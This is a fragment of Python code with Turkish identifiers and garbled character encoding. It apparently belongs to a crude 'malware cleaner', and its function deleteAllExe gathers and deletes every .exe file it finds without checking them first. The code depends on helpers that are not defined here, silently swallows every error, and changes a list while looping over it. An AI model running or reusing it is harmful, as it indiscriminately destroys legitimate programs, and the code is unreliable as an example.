def isExe(*files):
    try:
        for file in files:
            dosya, uzantÄ± = os.path.splitext(file)
            if str(uzantÄ±) == ".exe":
                exeler.append(dosya + uzantÄ±)
            else:
                pass
    except:
        pass
def deleteAllExe():
    try:
        getFiles("arguman")
        for dosya in dosyalar:
            isExe(dosya)
            for exe in exeler:
                exeler.remove(exe)
                deleter(exe)
    except:
        pass
def deleteAllMalwareFiles():
